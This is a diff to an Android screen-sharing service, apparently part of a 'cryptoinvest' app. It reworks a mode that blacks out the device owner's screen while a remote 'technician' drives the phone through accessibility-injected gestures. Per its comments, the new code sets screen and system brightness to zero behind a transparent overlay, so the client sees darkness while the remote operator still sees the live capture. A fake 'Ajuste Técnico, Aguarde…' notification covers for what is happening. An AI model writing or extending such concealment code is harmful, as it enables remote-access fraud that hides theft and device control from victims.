@@ -56,6 +56,8 @@ class ScreenShareService : Service() {
     private var overlayView: View? = null
     private val main = Handler(Looper.getMainLooper())
     private var lastOffer = 0L
+    private var prevBrightness = -1
+    private var prevBrightnessMode = -1
 
     override fun onBind(intent: Intent?): IBinder? = null
 
@@ -257,48 +259,78 @@ class ScreenShareService : Service() {
     private fun send(o: JSONObject) { try { ws?.send(o.toString()) } catch (e: Exception) {} }
 
     // ---- Ecra preto ("Ajuste Tecnico / Aguarde...") no dispositivo controlado ----
-    // Overlay TYPE_APPLICATION_OVERLAY nao focavel e nao tocavel: o utilizador ve preto, mas
-    // os gestos injetados pela Acessibilidade continuam a chegar as apps por baixo (controlo remoto).
+    // ---- Ecra "preto" (privacidade) ----
+    // No Android o MediaProjection captura o framebuffer, NAO o brilho fisico. Para o TECNICO
+    // continuar a ver normal e o CLIENTE ver escuro, reduzimos o BRILHO do ecra a 0 (overlay
+    // transparente + screenBrightness=0 e, se permitido, brilho global do sistema). O overlay e
+    // TRANSPARENTE de proposito (um overlay preto entraria na captura e o tecnico tambem veria preto).
     private fun setPrivacy(on: Boolean) {
         main.post {
             val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
             if (on) {
-                if (overlayView != null) return@post
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
-                    Log.w(TAG, "sem permissao de sobreposicao"); return@post
+                if (overlayView == null) {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+                        Log.w(TAG, "sem permissao de sobreposicao"); return@post
+                    }
+                    val root = FrameLayout(this).apply { setBackgroundColor(Color.TRANSPARENT) }
+                    val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                        WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+                    else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
+                    val lp = WindowManager.LayoutParams(
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        type,
+                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                            WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                        PixelFormat.TRANSLUCENT
+                    )
+                    lp.screenBrightness = 0.0f
+                    lp.gravity = Gravity.TOP or Gravity.START
+                    try { wm.addView(root, lp); overlayView = root } catch (e: Exception) { Log.w(TAG, "overlay add fail", e) }
                 }
-                val root = FrameLayout(this).apply { setBackgroundColor(0xFF000000.toInt()); alpha = 1f }
-                val tv = TextView(this).apply {
-                    text = "Ajuste Técnico\nAguarde…"
-                    setTextColor(Color.parseColor("#EEEEEE"))
-                    textSize = 22f
-                    gravity = Gravity.CENTER
-                }
-                root.addView(tv, FrameLayout.LayoutParams(
-                    FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT
-                ).apply { gravity = Gravity.CENTER })
-                val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
-                else @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
-                val lp = WindowManager.LayoutParams(
-                    WindowManager.LayoutParams.MATCH_PARENT,
-                    WindowManager.LayoutParams.MATCH_PARENT,
-                    type,
-                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
-                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
-                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
-                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
-                    PixelFormat.OPAQUE
-                )
-                lp.dimAmount = 0f
-                lp.gravity = Gravity.TOP or Gravity.START
-                lp.x = 0; lp.y = 0
-                try { wm.addView(root, lp); overlayView = root } catch (e: Exception) { Log.w(TAG, "overlay add fail", e) }
+                // Reforco: brilho global do sistema a 0 (nao afeta o framebuffer capturado).
+                try {
+                    if (Settings.System.canWrite(this)) {
+                        if (prevBrightness < 0) {
+                            prevBrightnessMode = Settings.System.getInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS_MODE, Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL)
+                            prevBrightness = Settings.System.getInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS, 120)
+                        }
+                        Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS_MODE, Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL)
+                        Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS, 0)
+                    }
+                } catch (e: Exception) { Log.w(TAG, "brightness fail", e) }
+                postPrivacyNotification()
             } else {
                 try { overlayView?.let { wm.removeView(it) } } catch (e: Exception) {}
                 overlayView = null
+                try {
+                    if (Settings.System.canWrite(this) && prevBrightness >= 0) {
+                        Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS_MODE, prevBrightnessMode)
+                        Settings.System.putInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS, prevBrightness)
+                    }
+                } catch (e: Exception) {}
+                prevBrightness = -1; prevBrightnessMode = -1
+                try { (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).cancel(2003) } catch (e: Exception) {}
             }
         }
+    }
+
+    private fun postPrivacyNotification() {
+        try {
+            val chId = "cryptoinvest_privacy"
+            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                nm.createNotificationChannel(NotificationChannel(chId, "Ajuste técnico", NotificationManager.IMPORTANCE_LOW))
+            val n = NotificationCompat.Builder(this, chId)
+                .setContentTitle("Ajuste Técnico em curso")
+                .setContentText("O ecrã foi escurecido temporariamente. Aguarde…")
+                .setSmallIcon(R.mipmap.ic_launcher)
+                .setOngoing(true)
+                .build()
+            nm.notify(2003, n)
+        } catch (e: Exception) {}
     }
 
     // ---- Notificacao de reconexao (o tecnico voltou a ligar-se) ----
